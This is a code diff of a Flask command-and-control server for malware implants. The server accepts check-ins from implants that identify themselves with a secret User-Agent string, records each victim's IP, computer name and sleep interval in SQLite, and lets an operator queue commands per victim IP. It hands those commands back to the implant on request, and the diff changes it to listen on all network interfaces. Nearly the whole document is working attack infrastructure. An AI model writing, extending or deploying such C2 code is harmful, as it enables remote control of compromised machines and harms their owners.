@@ -2,12 +2,12 @@ from flask import Flask, render_template, request, url_for, redirect, jsonify
 import sqlite3
 from flask.cli import AppGroup
 from datetime import datetime
-import os
+import os, cv2, string
 import requests
 import random
 import string
-import numpy as np
 import json
+
 
 if os.path.exists('./data/real.db'):
     pass
@@ -17,7 +17,7 @@ else:
 app = Flask(__name__)
 
 dbpath = "sqlite:///data/real.db"
-# sushi.db < create.sql
+# real.db < create.sql
 
 # connection = sqlite3.connect("./data/real.db")
 # cursor = connection.cursor()
@@ -34,10 +34,10 @@ def addImplant(data):
         "SELECT id FROM Implants WHERE agentId=?", [(data["agentId"])])]
     if len(results) == 0:
         parsedData = ["PleaseGiveA", makeId(), str(
-            datetime.today()), data["IP"], data["sleepTime"], data["guido"], data["computerName"], data["DHkey"], "[]"]
+            datetime.today()), data["IP"], data["sleepTime"], data["guido"], data["computerName"], data["cmdQ"]]
 
-        cursor.execute('INSERT INTO Implants (authorize_code, agentId, checkTime, IP, sleepTime, guido, computerName, DHkey, cmdQ)\
-                        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)', parsedData)
+        cursor.execute('INSERT INTO Implants (authorize_code, agentId, checkTime, IP, sleepTime, guido, computerName, cmdQ)\
+                        VALUES (?, ?, ?, ?, ?, ?, ?, ?)', parsedData)
         connection.commit()
 
     elif (len(results) == 1):
@@ -80,11 +80,21 @@ def check():
     print(request.headers["User-Agent"])
     if (request.headers["User-Agent"]) == "IWasBornInTheUSA":
         # raw data function d = request.get_data()
-        print("test")
+        #print("test")
+        #print("first:", request.data, type(request.data))
+        
         data = request.data.decode("utf-8")
+        #print("before", type(data))
+        
         #print(type(json.loads(data)))
+        
+        # loaded=json.loads(data)
+        # data=json.dumps(loaded, indent=4, sort_keys=True)
         data=json.loads(data)
+        #print("after", data)
         data["IP"] = request.remote_addr
+        data["cmdQ"] = "No Cmds"
+        print(data)
         addImplant(data)
         return data
     else:
@@ -108,9 +118,15 @@ def cmds():
     if len(ans)==0:
         return ("That IP is not in the table, commands won't be executed")
     elif len(ans)==1:
-        prevCmd = np.array(ans[0])
-        fullCmd = str(np.concatenate((prevCmd, cmds)).tolist())
-        cursor.execute("UPDATE cmdQ SET cmdQ = ? WHERE IP = ?", [(fullCmd, ip)])
+        fullCmd = ans[0][0]
+        for arg in cmds:
+            if fullCmd == "No Cmds":
+                fullCmd = arg
+            else:
+                fullCmd += " "+arg
+        fullCmd+=";"
+        cursor.execute("UPDATE Implants SET cmdQ = ? WHERE IP = ?", (fullCmd, ip))
+        connection.commit()
         connection.close()
         return ("Commands have been placed in queue")
     else:
@@ -124,12 +140,18 @@ def getJobs():
         ip = request.remote_addr
         connection = sqlite3.connect("./data/real.db")
         cursor = connection.cursor()
-        ans =[x for x in cursor.execute("SELECT cmdQ FROM Implants WHERE IP = ?", [ip])]
-        return ans
+        ans = []
+        for x in cursor.execute("SELECT cmdQ FROM Implants WHERE IP = ?", [ip]):
+            ans+=x
+        print(ans)
+        if len(ans)==0:
+            return str("No Tasks")
+        else:
+            return str(ans)
     else:
         return render_template("wrongTurn.html")
 
 if __name__ == "__main__":
-    app.run(debug=False)
+    app.run(host="0.0.0.0")
 
 # gunicorn -w 5 runserver.py
